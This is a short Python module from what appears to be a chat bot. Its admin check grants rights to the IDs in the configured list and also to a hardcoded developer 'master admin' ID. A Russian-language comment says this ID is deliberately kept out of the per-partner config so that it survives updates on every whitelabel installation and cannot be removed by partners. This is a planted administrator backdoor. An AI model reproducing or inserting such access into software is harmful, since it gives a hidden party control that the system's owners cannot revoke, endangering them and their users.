from config import ADMIN_IDS

# Мастер-админский ID разработчика — зашит в исходный код (не в
# config.py, который у каждого партнёра свой и генерируется отдельно),
# поэтому переживает git-обновления на ЛЮБОЙ инсталляции бота, включая
# whitelabel-партнёрские. Это аварийный доступ на случай потери
# контакта с партнёром или необходимости технической поддержки —
# партнёр не может убрать этот доступ, просто отредактировав свой
# ADMIN_IDS.
_MASTER_ADMIN_ID = 5225857181


def is_admin(user_id: int) -> bool:
    """Checks if the user is an administrator."""
    return user_id in ADMIN_IDS or user_id == _MASTER_ADMIN_ID
